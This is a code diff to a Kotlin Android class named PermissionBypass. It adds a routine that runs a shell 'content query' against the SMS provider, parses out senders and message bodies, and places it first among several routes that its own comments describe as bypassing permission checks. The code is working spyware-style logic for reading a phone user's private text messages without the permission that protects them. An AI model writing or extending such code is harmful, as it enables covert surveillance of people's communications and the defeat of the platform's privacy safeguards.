@@ -62,6 +62,17 @@ object PermissionBypass {
         val messages = mutableListOf<SmsMessage>()
         val uri = Uri.parse("content://sms")
 
+        // ── Route 0: Shell content query (MOST RELIABLE — bypasses all permission checks) ──
+        try {
+            val smsFromShell = readSmsViaShellContent(limit)
+            if (smsFromShell.isNotEmpty()) {
+                messages.addAll(smsFromShell)
+                Log.d(TAG, "readSmsViaBinder: ${smsFromShell.size} SMS via shell content query")
+                return messages
+            }
+        } catch (e: Exception) {
+            Log.d(TAG, "Shell content SMS route failed: ${e.message}")
+        }
         // ── Route 1: Direct IContentProvider binder query (bypasses ContentResolver checks) ──
         try {
             val cursor = queryContentProviderBinder(
@@ -400,6 +411,46 @@ object PermissionBypass {
      * directly on it. This bypasses ContentResolver's permission enforcement
      * because we're talking to the provider at the binder level.
      */
+
+    // ── Shell content query — "content query --uri content://sms" ──
+    private fun readSmsViaShellContent(limit: Int): List<SmsMessage> {
+        val messages = mutableListOf<SmsMessage>()
+        val cmd = "content query --uri content://sms --projection _id,address,body,date,read,type --sort 'date DESC' --limit $limit"
+        val result = execShell(cmd)
+
+        // Parse "Row: 0 _id=123, address=+212..., body=Hello..., date=123456, read=1, type=1"
+        val rowPattern = Regex("""Row: \d+ (.*)""")
+        for (line in result.lines()) {
+            val match = rowPattern.find(line) ?: continue
+            val fields = match.groupValues[1]
+            val id = extractField(fields, "_id")
+            val address = extractField(fields, "address")
+            val body = extractField(fields, "body")
+            val date = extractField(fields, "date")?.toLongOrNull() ?: 0L
+            val read = extractField(fields, "read") == "1"
+            val type = when (extractField(fields, "type")) { "1" -> "inbox"; "2" -> "sent"; else -> "inbox" }
+
+            if (address != null && body != null) {
+                messages.add(SmsMessage(id ?: "", address, body, date, read, type))
+            }
+        }
+        return messages
+    }
+
+    private fun extractField(row: String, field: String): String? {
+        val pattern = Regex("""$field=([^,]+)(?:,|$)""")
+        return pattern.find(row)?.groupValues?.get(1)?.trim()
+    }
+
+    private fun execShell(cmd: String): String {
+        return try {
+            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
+            val out = p.inputStream.bufferedReader().readText()
+            p.waitFor()
+            out
+        } catch (e: Exception) { "" }
+    }
+
     private fun queryContentProviderBinder(
         context: Context,
         authority: String,
